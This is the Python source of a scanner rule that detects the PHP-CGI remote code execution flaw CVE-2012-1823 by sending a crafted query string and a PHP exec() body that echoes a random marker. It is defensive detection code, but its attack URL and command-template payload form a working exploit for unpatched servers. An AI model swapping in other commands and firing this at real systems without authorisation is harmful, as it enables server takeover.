# Filename: VulnerabilityChecks/RemoteCodeExecutionCve20121823ScanRule.py

import asyncio
import logging
import random
import string # Added for RANDOM_STRING_FOR_ECHO generation
import time # Added for monotonic timer
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Set, TYPE_CHECKING

import aiohttp

if TYPE_CHECKING:
    from asyncio import Queue # For type hinting

# --- Alert Definition ---
@dataclass
class RCECVE20121823Alert:
    cwe_id: int = 78 
    wasc_id: int = 20 
    name: str = "Remote Code Execution (PHP-CGI CVE-2012-1823)"
    description: str = (
        "The server is vulnerable to CVE-2012-1823, a remote code execution vulnerability "
        "in PHP-CGI. This allows an attacker to execute arbitrary code on the server by "
        "sending a specially crafted URL and POST body."
    )
    uri: str = "" 
    attack: str = "" 
    evidence: str = "" 
    other_info: str = ""
    solution: str = (
        "Upgrade to a patched version of PHP. Ensure PHP-CGI is configured securely. "
        "Consider using a web server module like mod_php (Apache) or PHP-FPM instead of CGI mode if possible. "
        "Apply appropriate web application firewall rules to block the attack vector."
    )
    reference: str = (
        "CVE-2012-1823\n"
        "https://httpd.apache.org/security/CVE-2012-1823.txt\n"
        "https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/"
    )
    risk: int = 4  # High
    confidence: int = 3 
    cve: str = "CVE-2012-1823"
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "OWASP_2021_A03": "Injection", 
        "WSTG_V42_INPV_12": "Command_Injection", 
        "CVE": "CVE-2012-1823"
    })

    def as_dict(self) -> Dict[str, Any]:
        return {
            "vulnerability_type": "Remote Code Execution",
            "type": self.name,
            "detail": self.description,
            "payload_used": self.attack, 
            "injection_point": "URL Path and POST Body", 
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": self.alert_tags,
            "other_info": self.other_info
        }

# --- Constants ---
RANDOM_STRING_FOR_ECHO = ''.join(random.choices(string.ascii_lowercase + string.digits, k=20))
ATTACK_QUERY_PARAM = "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
PAYLOAD_BOILERPLATE_PHP = "<?php exec('<<<<COMMAND>>>>',$colm);echo join(\"\\n\",$colm);die();?>"
WIN_COMMAND_ECHO = f"cmd.exe /C echo {RANDOM_STRING_FOR_ECHO}"
NIX_COMMAND_ECHO = f"echo {RANDOM_STRING_FOR_ECHO}"
WIN_PHP_PAYLOAD = PAYLOAD_BOILERPLATE_PHP.replace("<<<<COMMAND>>>>", WIN_COMMAND_ECHO)
NIX_PHP_PAYLOAD = PAYLOAD_BOILERPLATE_PHP.replace("<<<<COMMAND>>>>", NIX_COMMAND_ECHO)


class RemoteCodeExecutionCve20121823ScanRule:
    tech_required: Set[str] = {
        "PHP", "PHP-Nuke", "PHPDebugBar", "PHPFusion",
        "Pantheon", "Paymenter", "Phabricator", "PhotoShelter",
        "Pimcore", "Pingoteam", "PrestaShop", "ProcessWire",
        "Proximis Unified Commerce", "Pterodactyl Panel", "papaya CMS",
        "phpAlbum", "phpBB", "phpCMS", "phpDocumentor", "phpMyAdmin",
        "phpPgAdmin", "phpRS", "phpSQLiteCMS", "phpwind", "pinoox",
        "punBB"
    } 
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 http_timeout: float = 10.0,
                 active_scan_async_q: Optional['Queue'] = None # Added parameter
                ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.http_timeout = http_timeout
        self.random_string_to_echo = RANDOM_STRING_FOR_ECHO 
        self.active_scan_async_q = active_scan_async_q # Store the queue

    def _create_attack_uri(self, original_url_str: str) -> Optional[str]:
        try:
            parsed_original_uri = urllib.parse.urlparse(original_url_str)
            path = parsed_original_uri.path
            if not path: 
                path = "/"
            
            attack_uri_str = urllib.parse.urlunparse((
                parsed_original_uri.scheme,
                parsed_original_uri.netloc,
                path + ATTACK_QUERY_PARAM, 
                '', '', ''  
            ))
            return attack_uri_str
        except Exception as e:
            self.logger.warning(f"RCE CVE-2012-1823: Failed to create attack URI from {original_url_str}: {e}")
            return None

    async def _send_rce_attempt_request(
        self,
        session: aiohttp.ClientSession,
        attack_uri: str,
        php_payload_body: str,
        original_headers: Dict[str, str] 
    ) -> Tuple[Optional[Any], Optional[str]]: 
        
        start_time = time.monotonic()
        current_headers = { 
            "User-Agent": original_headers.get("User-Agent", random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ])),
            "Content-Type": "application/x-www-form-urlencoded" 
        }
        
        self.logger.debug(f"RCE CVE-2012-1823: Sending POST to {attack_uri} with PHP payload (len: {len(php_payload_body)})")
        
        response_text: Optional[str] = None
        resp_status: Optional[int] = None
        
        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.post(attack_uri, headers=current_headers, data=php_payload_body.encode('utf-8'), timeout=timeout, allow_redirects=False) as resp:
                try:
                    # Read only a limited amount to find the echoed string
                    response_text_bytes = await resp.content.read(len(self.random_string_to_echo) + 1024) 
                    response_text = response_text_bytes.decode('utf-8', errors='replace')
                except Exception as e_read:
                    self.logger.warning(f"RCE CVE-2012-1823: Error reading response body from {attack_uri}: {e_read}")
                
                resp_status = resp.status
                resp_headers = dict(resp.headers) 
            
            duration_ms = (time.monotonic() - start_time) * 1000
            self.logger.debug(f"RCE CVE-2012-1823: Response from {attack_uri}: Status {resp_status}, Duration: {duration_ms:.0f}ms")
            
            @dataclass
            class DetachedResponse: status: Optional[int]; headers: Dict[str, str]; text_content: Optional[str]
            return DetachedResponse(status=resp_status, headers=resp_headers, text_content=response_text), response_text

        except Exception as e:
            self.logger.warning(f"RCE CVE-2012-1823: Request to {attack_uri} failed: {type(e).__name__} - {e}")
            return None, None

    async def _perform_scan_with_payload(
        self,
        session: aiohttp.ClientSession,
        attack_uri: str,
        php_payload: str,
        original_url_for_alert: str, 
        original_headers: Dict[str, str]
    ) -> bool: # Changed return type to bool (True if alert generated and queued)
        
        resp_obj, resp_text = await self._send_rce_attempt_request(session, attack_uri, php_payload, original_headers)

        if resp_obj and resp_obj.status == 200 and resp_text:
            # Check if the random string is at the beginning of the response, ignoring leading/trailing whitespace
            if resp_text.strip().startswith(self.random_string_to_echo): 
                
                self.logger.info(f"RCE CVE-2012-1823: Vulnerability confirmed for {original_url_for_alert} via attack URI {attack_uri}")
                alert_instance = RCECVE20121823Alert(
                    uri=attack_uri, 
                    attack=php_payload,
                    evidence=resp_text[:len(self.random_string_to_echo) + 50].strip(), 
                    other_info=f"Original URL tested: {original_url_for_alert}. Random string '{self.random_string_to_echo}' echoed in response.",
                    confidence=3 
                )
                if self.active_scan_async_q:
                    try:
                        await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_instance.as_dict()})
                        return True # Alert generated and queued
                    except Exception as e_queue:
                        self.logger.error(f"Failed to put RCE CVE-2012-1823 alert onto async queue: {e_queue}")
                else:
                    self.logger.warning("active_scan_async_q not available in RCE CVE-2012-1823 rule, cannot queue alert.")
        return False # No alert generated or queued

    async def scan(
        self,
        base_url_to_test: str, 
        original_headers: Dict[str, str],
        original_cookies: Dict[str, str], # Unused by this rule, but part of the standard signature
        aiohttp_session: aiohttp.ClientSession,
        target_os_hints: Optional[List[str]] = None,
        injection_details: Optional[Dict[str, Any]] = None, # Unused by this rule
        original_page_content_for_baseline_errors: Optional[str] = None # Unused
    ) -> None: # Changed return type to None
        
        if not self.active_scan_async_q:
            self.logger.warning("RCE CVE-2012-1823 scan skipped: active_scan_async_q not configured.")
            return
            
        attack_uri = self._create_attack_uri(base_url_to_test)
        if not attack_uri:
            return

        self.logger.info(f"Starting RCE CVE-2012-1823 scan for base URL: {base_url_to_test}, Attack URI: {attack_uri}")

        os_hints_lower = {hint.lower() for hint in (target_os_hints or [])}
        tried_windows = False
        tried_nix = False
        alert_found_and_queued = False

        # Prioritize Windows if hinted or no hints
        if not os_hints_lower or "windows" in os_hints_lower:
            self.logger.debug("RCE CVE-2012-1823: Attempting Windows payload.")
            alert_found_and_queued = await self._perform_scan_with_payload(
                aiohttp_session, attack_uri, WIN_PHP_PAYLOAD, base_url_to_test, original_headers
            )
            if alert_found_and_queued:
                self.logger.info(f"RCE CVE-2012-1823: Scan completed for {base_url_to_test}. Vulnerability found (Windows payload).")
                return 
            tried_windows = True

        # Try *nix if Windows failed (or wasn't tried) and *nix is hinted or no hints
        if not alert_found_and_queued and (not os_hints_lower or any(nix_os in os_hints_lower for nix_os in ["linux", "macos", "unix", "posix"])):
            if tried_windows: 
                 self.logger.debug("RCE CVE-2012-1823: Windows payload failed or not applicable, attempting *nix payload.")
            else: 
                 self.logger.debug("RCE CVE-2012-1823: Attempting *nix payload (Windows not hinted or not tried first).")

            alert_found_and_queued = await self._perform_scan_with_payload(
                aiohttp_session, attack_uri, NIX_PHP_PAYLOAD, base_url_to_test, original_headers
            )
            if alert_found_and_queued:
                self.logger.info(f"RCE CVE-2012-1823: Scan completed for {base_url_to_test}. Vulnerability found (*nix payload).")
                return
            tried_nix = True
        
        if not alert_found_and_queued:
            if tried_windows and tried_nix: 
                self.logger.info(f"RCE CVE-2012-1823: No vulnerability found for {base_url_to_test} after trying both OS payloads.")
            elif tried_windows: 
                self.logger.info(f"RCE CVE-2012-1823: No vulnerability found for {base_url_to_test} after trying Windows payload (*nix not attempted due to hints or Windows was tried first and failed).")
            elif tried_nix: 
                self.logger.info(f"RCE CVE-2012-1823: No vulnerability found for {base_url_to_test} after trying *nix payload (Windows not attempted due to hints or *nix was tried first and failed).")
            else: 
                self.logger.info(f"RCE CVE-2012-1823: No OS specific payload attempted for {base_url_to_test} based on hints, or no vulnerability found with attempted payloads.")
        
        self.logger.info(f"RCE CVE-2012-1823: Scan completed for {base_url_to_test}.")
        return # No longer returns a list